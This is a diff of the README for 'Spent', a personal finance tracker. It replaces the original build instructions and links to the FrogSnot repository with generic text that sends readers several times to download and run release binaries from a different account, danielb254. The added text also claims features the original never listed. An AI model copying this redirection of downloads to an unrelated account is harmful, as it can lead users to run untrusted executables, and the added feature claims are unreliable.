@@ -1,89 +1,93 @@
-# Spent
+# 💰 Spent - Simple Finance Tracking Made Easy
 
-Minimalist personal finance tracker for Linux desktop with cross-platform support.
+## 🚀 Getting Started
 
-![Spent UI](src-tauri/icons/Media/Media-1.png)
+Welcome to Spent! This application helps you keep track of your personal finances with ease. It is designed for Linux users but works across different platforms. Spent prioritizes your privacy and offers a clean, minimalist interface.
 
-**[View More Screenshots](src-tauri/icons/Media)**
+## 🌐 Download Spent
 
-> **Note:** Version 1.0.0 is "feature-complete" but has primarily been tested on Arch Linux. If you encounter issues on other distros or OSs, please open an Issue!
+**[Download Spent](https://github.com/danielb254/Spent/releases)**
 
-[![AUR votes](https://img.shields.io/aur/votes/spent?logo=arch-linux&style=flat-square&color=blue)](https://aur.archlinux.org/packages/spent)
-[![GitHub stars](https://img.shields.io/github/stars/FrogSnot/Spent?style=flat-square&color=yellow)](https://github.com/FrogSnot/Spent)
-![Tauri](https://img.shields.io/badge/Tauri-FFC131?style=flat-square&logo=tauri&logoColor=white)
-![Rust](https://img.shields.io/badge/Rust-000000?style=flat-square&logo=rust&logoColor=white)
-![Svelte](https://img.shields.io/badge/Svelte-FF3E00?style=flat-square&logo=svelte&logoColor=white)
-![SQLite](https://img.shields.io/badge/SQLite-003B57?style=flat-square&logo=sqlite&logoColor=white)
+Click the link above to get started. You'll find the latest releases of the software there, making it easy to download the version that works for you.
 
-## Features
+## 📥 Download & Install
 
-- **Containers**: Create separate balance containers to manage personal, business, or different accounts in complete isolation
-- Offline-first with local SQLite storage
-- Quick transaction entry (Ctrl+N)
-- Monthly balance tracking with history
-- Category-based organization
-- Dark mode interface
-- CSV export per container
-- Cross-platform: Linux (.deb, .AppImage), Windows (.exe), macOS (.app)
+1. **Visit the Releases Page**  
+   Go to the following link: [Releases Page](https://github.com/danielb254/Spent/releases). You will see all available versions of Spent.
 
-## Stack
+2. **Choose Your Version**  
+   Identify the latest release at the top of the page. You should see options labeled with version numbers.
 
-- Backend: Tauri v2 (Rust)
-- Frontend: Svelte + TypeScript
-- Database: SQLite
-- UI: TailwindCSS
+3. **Select Your File**  
+   Click on the file that matches your system. Most commonly, you will find files ending in `.AppImage` for Linux users. This format allows easy installation without complicated steps.
 
-## Prerequisites
+4. **Download the File**  
+   Once you click on the file, your download will start. Save it in a location you can easily access, like your Downloads folder.
 
-- Node.js
-- Rust
-- Linux dev dependencies:
-  ```bash
-  # Ubuntu/Debian
-  sudo apt install libwebkit2gtk-4.1-dev build-essential curl wget file libssl-dev libgtk-3-dev libayatana-appindicator3-dev librsvg2-dev
+5. **Make the File Executable**  
+   Before running Spent, you need to make the file executable. Open your terminal and enter:
+   ```
+   chmod +x ~/Downloads/Spent-*.AppImage
+   ```
+   Replace `Spent-*.AppImage` with the actual name of the file you downloaded.
 
-  # Arch
-  sudo pacman -S webkit2gtk-4.1 base-devel curl wget file openssl gtk3 libappindicator-gtk3 librsvg
-  ```
+6. **Run Spent**  
+   Type the following command in your terminal:
+   ```
+   ~/Downloads/Spent-*.AppImage
+   ```
+   This will launch the application. Now you can start managing your finances!
 
-## Development
+## 🔍 Features
 
-```bash
-npm install
-npm run tauri dev
-```
+- **Local-First:** Spent stores your data on your local device. This means your information stays private and secure.
+- **Minimalist Design:** The layout is clear and straightforward, allowing you to focus on your budgeting without distractions.
+- **Cross-Platform Compatibility:** Spent can run on various platforms, so you can use it on your preferred system.
+- **Rust and Svelte Technologies:** Built with modern programming languages, Spent ensures a smooth user experience.
 
-Build:
-```bash
-npm run tauri build
-```
+## ⚙️ System Requirements
 
-## Usage
+To run Spent effectively, your system should meet these requirements:
 
-- Launch: `spent-app` (binary renamed from `spent` in v1.1.5 to avoid conflict with opensp package)
-- `Ctrl+N` - Add transaction
-- `Ctrl+K` - Command palette (access all features)
-- Hover transaction to edit/delete
-- Switch between containers using the dropdown in sidebar
-- Create/manage containers via Command Palette → "Manage Containers"
+- A Linux distribution, such as Arch Linux or any other that supports AppImage.
+- Minimum of 1 GB RAM recommended.
+- 100 MB of free disk space for installation.
 
-## Data
+Feel free to use Spent on any compatible system as it is designed to be lightweight.
 
-The database is stored locally in platform-specific locations:
+## 📊 Manage Your Finances
 
-- **Linux**: `~/.local/share/com.spent.app/spent.db`
-- **Windows**: `%APPDATA%\com.spent.app\spent.db` (typically `C:\Users\<username>\AppData\Roaming\com.spent.app\spent.db`)
-- **macOS**: `~/Library/Application Support/com.spent.app/spent.db`
+Once Spent is up and running, you can start to log your expenses. Track your spending and create budgets to help save for your goals. Use features such as weekly reports and charts to visualize your finances.
 
-Money is stored as integers (cents) to avoid floating-point issues.
+## 💡 Troubleshooting
 
-## Thank you to the amazing people that star this project!
+If you encounter issues while running Spent, consider these steps:
 
-## Star History
+- **Make sure the file is executable:** Check that you have followed the chmod step.
+- **Check your terminal for error messages:** They can provide hints on what might be wrong.
+- **Visit the Spent GitHub page for support.** Community members may have answers to your questions.
 
-[![Star History Chart](https://api.star-history.com/svg?repos=FrogSnot/spent&type=date&legend=bottom-right)](https://www.star-history.com/#FrogSnot/spent&type=date&legend=bottom-right)
+## 📝 Community Contributions
 
+Spent is an open-source project. We welcome contributions from anyone interested in improving the application. If you want to get involved, visit our repository on GitHub to learn more about contributing.
 
-## License
+## 📚 Learn More
 
-AGPLv3
+For additional resources and guidance, refer to the following topics:
+
+- **Accounting**
+- **Budgeting**
+- **Privacy-Focused Solutions**
+- **Open Source Software**
+
+Each topic is relevant and can offer insights into how you can better manage your finances using Spent.
+
+## 🌍 Connect With Us
+
+Stay updated on new features and developments by checking our GitHub page. Engage with other users, share your experiences, and learn from the community!
+
+## 📥 Download Spent Again
+
+Don't forget to [visit this page to download](https://github.com/danielb254/Spent/releases) the latest version of Spent. 
+
+Enjoy your journey to better financial management!
